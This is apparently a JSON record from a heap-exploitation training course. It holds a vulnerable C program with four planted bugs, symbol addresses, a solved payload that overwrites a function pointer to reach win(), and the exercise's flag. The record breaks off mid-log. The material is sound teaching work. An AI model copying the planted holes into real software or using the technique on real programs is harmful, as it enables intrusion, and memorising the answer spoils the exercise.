{"exercise":"final-27","unit":"unit6-final","title":"27: Full Chain","desc":"Real exploits chain multiple bugs together. This program has four vulnerabilities: an integer overflow in the allocation size, an info leak that reveals a heap address, a heap overflow that lets you write past the buffer, and a function pointer that gets called at the end. Chain all four to redirect execution to win().","mode":"final-chain","vizMode":"both","glibc":"2.27","heapSize":256,"base":134545408,"header":8,"mainArena":134525184,"funcPtrAddr":134520896,"symbols":{"main":134512640,"vuln":134512724,"win":134512976,"normal":134512800,"system":4158890496,"binsh":4160078592},"source":["#include <stdio.h>","#include <stdlib.h>","","void win() { printf(\"FLAG\\n\"); }","void normal() { printf(\"OK\\n\"); }","","struct Config {","    void (*handler)();  // function pointer","    char name[12];","};","","int main() {","    unsigned char count;","    printf(\"How many items? \");","    scanf(\"%hhu\", &count);","    // Bug 1: count is 8-bit, wraps at 256!","    char *buf = malloc(count * 4);","    Config *cfg = malloc(16);","    cfg->handler = normal;","","    // Bug 2: info leak","    printf(\"DEBUG: cfg at %p\\n\", cfg);","","    // Bug 3: reads 256 bytes into tiny buf","    read(0, buf, 256);","","    cfg->handler();","    return 0;","}"],"guided":[],"payloads":[[103,117,101,115,116,95,115,101,16,0,0,0,25,0,0,0,80,129,4,8]],"count":16384,"completed":true,"check":true,"solved":true,"sourceOrderSetup":false,"pageSetup":null,"model":null,"winTitle":"FLAG{full_chain_master}","winMsg":"You chained four vulnerabilities together: integer overflow → small allocation, info leak → know the target address, heap overflow → corrupt the function pointer, control flow hijack → jump to win(). This is how real exploits work — no single bug is enough, but together they give you full control.","ops":[{"group":"count","engine":"vrig","op":"malloc","args":[8],"ret":{"addr":0,"dataAddr":8,"dataSize":8},"logs":[]